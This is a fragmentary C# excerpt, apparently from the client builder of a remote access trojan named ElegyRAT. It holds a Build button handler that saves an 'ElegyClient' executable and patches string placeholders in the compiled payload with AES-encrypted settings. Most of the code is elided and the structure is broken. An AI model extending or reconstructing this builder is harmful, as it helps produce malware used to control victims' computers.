        ...
        private async void BtnBuild_Click(object sender, EventArgs e)
        {
            ...
            try
            {
                ...
                using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
                {
                    ...
                    saveFileDialog1.FileName = "ElegyClient";
                    if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                    {
                        ...
                        MessageBox.Show("完成!", "ElegyRAT | 生成客户端", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        SaveSettings();
                        this.Close();
                    }
                }
            ...
            catch (Exception ex)
            {
                ...
                MessageBox.Show(ex.Message, "ElegyRAT | 生成客户端", MessageBoxButtons.OK, MessageBoxIcon.Error);
                asmDef?.Dispose();
                            ...
                            for (int i = 0; i < method.Body.Instructions.Count(); i++)
                            {
                                if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                {
                                    ...
                                    if (method.Body.Instructions[i].Operand.ToString() == "%Version%")
                                        ...
                                        method.Body.Instructions[i].Operand = aes.Encrypt(Settings.Version.Replace("ElegyRAT ", ""));
